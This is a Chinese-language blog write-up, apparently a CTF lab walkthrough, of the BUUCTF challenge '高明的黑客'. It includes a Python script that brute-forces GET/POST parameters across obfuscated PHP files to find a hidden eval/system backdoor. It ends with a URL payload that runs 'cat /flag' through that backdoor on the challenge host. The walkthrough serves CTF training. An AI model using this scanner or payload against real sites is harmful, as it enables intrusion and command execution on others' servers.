@@ -1,0 +1,738 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="en">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="高明的黑客打开之后得到一个提示源代码存在了www.tar.gz 当时比赛的时候遇到这个题，还一直脑残的以为是某个网站，哭了直接URL访问之后，会下载到源码http:&#x2F;&#x2F;c9d08f8b-8738-4265-a7ec-e5f223c985cf.node3.buuoj.cn&#x2F;www.tar.gz 下载好了之后推测是个压缩包之类的，搜一下gz后缀，果然是常见于Linux和MacOS下的压缩包格式，直接7">
+<meta property="og:type" content="article">
+<meta property="og:title" content="BUUCTF-高明的黑客">
+<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;01&#x2F;20&#x2F;BUUCTF-%E9%AB%98%E6%98%8E%E7%9A%84%E9%BB%91%E5%AE%A2&#x2F;index.html">
+<meta property="og:site_name" content="diao-diao-UPUP">
+<meta property="og:description" content="高明的黑客打开之后得到一个提示源代码存在了www.tar.gz 当时比赛的时候遇到这个题，还一直脑残的以为是某个网站，哭了直接URL访问之后，会下载到源码http:&#x2F;&#x2F;c9d08f8b-8738-4265-a7ec-e5f223c985cf.node3.buuoj.cn&#x2F;www.tar.gz 下载好了之后推测是个压缩包之类的，搜一下gz后缀，果然是常见于Linux和MacOS下的压缩包格式，直接7">
+<meta property="og:locale" content="en">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;BUUCTF&#x2F;%E9%AB%98%E6%98%8E%E7%9A%84%E9%BB%91%E5%AE%A2&#x2F;0.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;BUUCTF&#x2F;%E9%AB%98%E6%98%8E%E7%9A%84%E9%BB%91%E5%AE%A2&#x2F;1.png">
+<meta property="og:updated_time" content="2020-01-20T03:31:12.576Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;BUUCTF&#x2F;%E9%AB%98%E6%98%8E%E7%9A%84%E9%BB%91%E5%AE%A2&#x2F;0.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2020/01/20/BUUCTF-高明的黑客/"/>
+
+
+
+
+
+  <title>BUUCTF-高明的黑客 | diao-diao-UPUP</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="en">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">diao-diao-UPUP</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">我是一只web狗</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            About
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            Categories
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/20/BUUCTF-%E9%AB%98%E6%98%8E%E7%9A%84%E9%BB%91%E5%AE%A2/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="diao-diao">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/header.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="diao-diao-UPUP">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">BUUCTF-高明的黑客</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-01-20T08:48:02+08:00">
+                2020-01-20
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="高明的黑客"><a href="#高明的黑客" class="headerlink" title="高明的黑客"></a>高明的黑客</h1><p>打开之后得到一个提示源代码存在了<a href="http://www.tar.gz" target="_blank" rel="noopener">www.tar.gz</a></p>
+<p>当时比赛的时候遇到这个题，还一直脑残的以为是某个网站，哭了<br>直接URL访问之后，会下载到源码<br><a href="http://c9d08f8b-8738-4265-a7ec-e5f223c985cf.node3.buuoj.cn/www.tar.gz" target="_blank" rel="noopener">http://c9d08f8b-8738-4265-a7ec-e5f223c985cf.node3.buuoj.cn/www.tar.gz</a></p>
+<p>下载好了之后推测是个压缩包之类的，搜一下gz后缀，果然是常见于Linux和MacOS下的压缩包格式，直接7-zip解压</p>
+<p>发现有个src的文件，里面有很多杂乱的PHP文件，随便打开一个试试<br>发现读不太懂，但是像$_GET eval echo等还是有的</p>
+<p>这里就没有什么思路了，所以看了一下官方WP，找了一个爆破脚本遍历GET并传一些参数</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*- </span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">from</span> concurrent.futures.thread <span class="keyword">import</span> ThreadPoolExecutor</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">session = requests.Session()</span><br><span class="line"></span><br><span class="line">path = <span class="string">"D:\phpStudy\phpStudy\PHPTutorial\WWW\src"</span>  <span class="comment"># 文件夹目录</span></span><br><span class="line">files = os.listdir(path)  <span class="comment"># 得到文件夹下的所有文件名称</span></span><br><span class="line"></span><br><span class="line">mutex = threading.Lock()</span><br><span class="line">pool = ThreadPoolExecutor(max_workers=<span class="number">50</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read_file</span><span class="params">(file)</span>:</span></span><br><span class="line">    print(<span class="string">'finding...'</span>)</span><br><span class="line">    f = open(path + <span class="string">"/"</span> + file);  <span class="comment"># 打开文件</span></span><br><span class="line">    iter_f = iter(f);  <span class="comment"># 创建迭代器</span></span><br><span class="line">    str = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> iter_f:  <span class="comment"># 遍历文件，一行行遍历，读取文本</span></span><br><span class="line">        str = str + line</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 获取一个页面内所有参数</span></span><br><span class="line">    start = <span class="number">0</span></span><br><span class="line">    params = &#123;&#125;</span><br><span class="line">    <span class="keyword">while</span> str.find(<span class="string">"$_GET['"</span>, start) != <span class="number">-1</span>:</span><br><span class="line">        pos2 = str.find(<span class="string">"']"</span>, str.find(<span class="string">"$_GET['"</span>, start) + <span class="number">1</span>)</span><br><span class="line">        var = str[str.find(<span class="string">"$_GET['"</span>, start) + <span class="number">7</span>: pos2]</span><br><span class="line">        start = pos2 + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        params[var] = <span class="string">'echo("glzjin");'</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># print(var)</span></span><br><span class="line"></span><br><span class="line">    start = <span class="number">0</span></span><br><span class="line">    data = &#123;&#125;</span><br><span class="line">    <span class="keyword">while</span> str.find(<span class="string">"$_POST['"</span>, start) != <span class="number">-1</span>:</span><br><span class="line">        pos2 = str.find(<span class="string">"']"</span>, str.find(<span class="string">"$_POST['"</span>, start) + <span class="number">1</span>)</span><br><span class="line">        var = str[str.find(<span class="string">"$_POST['"</span>, start) + <span class="number">8</span>: pos2]</span><br><span class="line">        start = pos2 + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        data[var] = <span class="string">'echo("glzjin");'</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># print(var)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># eval test</span></span><br><span class="line">    r = session.post(<span class="string">'http://localhost/src/'</span> + file, data=data, params=params)</span><br><span class="line">    <span class="keyword">if</span> r.text.find(<span class="string">'glzjin'</span>) != <span class="number">-1</span>:</span><br><span class="line">        mutex.acquire()</span><br><span class="line">        print(file + <span class="string">" found!"</span>)</span><br><span class="line">        mutex.release()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># assert test</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> params:</span><br><span class="line">        params[i] = params[i][:<span class="number">-1</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">        data[i] = data[i][:<span class="number">-1</span>]</span><br><span class="line"></span><br><span class="line">    r = session.post(<span class="string">'http://localhost/src/'</span> + file, data=data, params=params)</span><br><span class="line">    <span class="keyword">if</span> r.text.find(<span class="string">'glzjin'</span>) != <span class="number">-1</span>:</span><br><span class="line">        mutex.acquire()</span><br><span class="line">        print(file + <span class="string">" found!"</span>)</span><br><span class="line">        mutex.release()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># system test</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> params:</span><br><span class="line">        params[i] = <span class="string">'echo glzjin'</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">        data[i] = <span class="string">'echo glzjin'</span></span><br><span class="line"></span><br><span class="line">    r = session.post(<span class="string">'http://localhost/src/'</span> + file, data=data, params=params)</span><br><span class="line">    <span class="keyword">if</span> r.text.find(<span class="string">'glzjin'</span>) != <span class="number">-1</span>:</span><br><span class="line">        mutex.acquire()</span><br><span class="line">        print(file + <span class="string">" found!"</span>)</span><br><span class="line">        mutex.release()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># print("====================")</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_file</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">for</span> file <span class="keyword">in</span> files:  <span class="comment"># 遍历文件夹</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.isdir(file):  <span class="comment"># 判断是否是文件夹，不是文件夹才打开</span></span><br><span class="line">            <span class="comment"># read_file(file)</span></span><br><span class="line"></span><br><span class="line">            pool.submit(read_file, file)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_param</span><span class="params">(fileName)</span>:</span></span><br><span class="line">    url = <span class="string">"http://localhost/src/"</span></span><br><span class="line">    f = open(path+<span class="string">'/'</span>+fileName, <span class="string">'r'</span>, encoding=<span class="string">'utf-8'</span>)</span><br><span class="line">    content = f.read()</span><br><span class="line">    m = re.findall(<span class="string">"\$_(GET|POST)\['(.+?)'\]"</span>, content)</span><br><span class="line">    <span class="keyword">if</span> m:</span><br><span class="line">        <span class="keyword">for</span> seq <span class="keyword">in</span> m:</span><br><span class="line">            print(<span class="string">'finding...'</span>)</span><br><span class="line">            method = seq[<span class="number">0</span>]</span><br><span class="line">            param = seq[<span class="number">1</span>]</span><br><span class="line">            payload = <span class="string">''</span></span><br><span class="line">            payload += <span class="string">'?'</span></span><br><span class="line">            payload += param</span><br><span class="line">            payload += <span class="string">"="</span></span><br><span class="line">            payload += <span class="string">"echo glzjin"</span></span><br><span class="line">            res = requests.get(url + fileName + payload)</span><br><span class="line">            n = re.findall(<span class="string">'glzjin'</span>, res.text)</span><br><span class="line">            <span class="keyword">if</span> n:</span><br><span class="line">                print(<span class="string">'found!'</span>)</span><br><span class="line">                print(fileName, method, param, <span class="string">"found!"</span>)</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            <span class="keyword">elif</span> method == <span class="string">'POST'</span>:</span><br><span class="line">                postData = &#123; param: <span class="string">"echo glzjin'"</span> &#125;</span><br><span class="line">                res = requests.post(url + fileName, data=postData)</span><br><span class="line">                n = re.findall(<span class="string">'glzjin'</span>, res.text)</span><br><span class="line">                <span class="keyword">if</span> n:</span><br><span class="line">                    print(fileName, method, param, <span class="string">"found!"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="comment">#find_file()</span></span><br><span class="line">    find_param(<span class="string">'xk0SzyKwfzw.php'</span>)</span><br></pre></td></tr></table></figure>
+
+<p>在运行脚本之前需要启动PHP环境 并根据自己的路径进行相应的修改<br><img src="/images/BUUCTF/%E9%AB%98%E6%98%8E%E7%9A%84%E9%BB%91%E5%AE%A2/0.png" alt="avatar"></p>
+<p>成功找到</p>
+<p>去这个文件去看看<br><img src="/images/BUUCTF/%E9%AB%98%E6%98%8E%E7%9A%84%E9%BB%91%E5%AE%A2/1.png" alt="avatar"><br>这个部分很关键</p>
+<p>接下来就构造payload:<br><a href="http://c9d08f8b-8738-4265-a7ec-e5f223c985cf.node3.buuoj.cn/xk0SzyKwfzw.php?Efa5BVG=cat%20/flag" target="_blank" rel="noopener">http://c9d08f8b-8738-4265-a7ec-e5f223c985cf.node3.buuoj.cn/xk0SzyKwfzw.php?Efa5BVG=cat%20/flag</a></p>
+<p>得到flag</p>
+<p>感觉不是太懂官方这个WP 为什么说那一段代码很关键 我表示一脸懵逼看不出来<br>后面又找了一篇WP，看了一下，大概就是该后门的密码之类的<br>可以参考一下：<br><a href="https://www.cnblogs.com/chrysanthemum/p/11717337.html" target="_blank" rel="noopener">https://www.cnblogs.com/chrysanthemum/p/11717337.html</a></p>
+<p>另外官方的脚本感觉就像已经知道了是哪个文件 特定也出来的 速度非常快 可能这就是出题人自己写WP的弊病吧 建议采用一下上面这篇文章里的脚本 虽然很慢 但是有那种爆破的感觉了 而不是直接输出是哪个文件</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/01/18/BUUCTF-admin/" rel="next" title="BUUCTF-admin">
+                <i class="fa fa-chevron-left"></i> BUUCTF-admin
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2020/01/20/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-ics-06/" rel="prev" title="攻防世界-ics-06">
+                攻防世界-ics-06 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/header.jpg"
+                alt="diao-diao" />
+            
+              <p class="site-author-name" itemprop="name">diao-diao</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives">
+              
+                  <span class="site-state-item-count">12</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">3</span>
+                  <span class="site-state-item-name">categories</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">2</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/diao-diao" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:302684932@qq.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#高明的黑客"><span class="nav-number">1.</span> <span class="nav-text">高明的黑客</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">diao-diao</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
